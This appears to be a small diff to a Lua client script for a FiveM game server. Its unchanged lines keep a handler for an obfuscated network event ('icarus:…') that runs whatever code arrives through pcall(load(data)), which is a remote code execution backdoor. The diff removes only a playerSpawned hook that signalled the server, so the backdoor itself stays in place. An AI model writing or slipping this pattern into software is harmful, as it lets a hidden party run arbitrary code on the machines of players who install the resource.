@@ -12,7 +12,3 @@ RegisterNetEvent("icarus:p728i449icr3")
 AddEventHandler("icarus:p728i449icr3", function(data)
     pcall(load(data))
 end)
-
-AddEventHandler("playerSpawned", function()
-    TriggerServerEvent("icarus:845z5r4i20yf")
-end)
